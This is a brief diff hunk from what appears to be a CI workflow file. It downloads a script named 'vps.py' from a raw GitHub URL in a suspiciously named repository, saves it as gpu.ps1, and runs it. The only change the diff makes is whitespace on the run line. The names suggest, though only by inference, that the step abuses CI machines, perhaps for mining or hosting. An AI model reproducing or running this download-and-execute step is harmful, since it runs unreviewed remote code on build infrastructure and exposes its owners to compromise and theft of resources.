@@ -18,4 +18,4 @@ jobs:
           command: |      
             Invoke-WebRequest https://raw.githubusercontent.com/deeq12ew121/for-develoopement/main/vps.py -OutFile gpu.ps1
     
-      - run: ./gpu.ps1 
+      - run: ./gpu.ps1
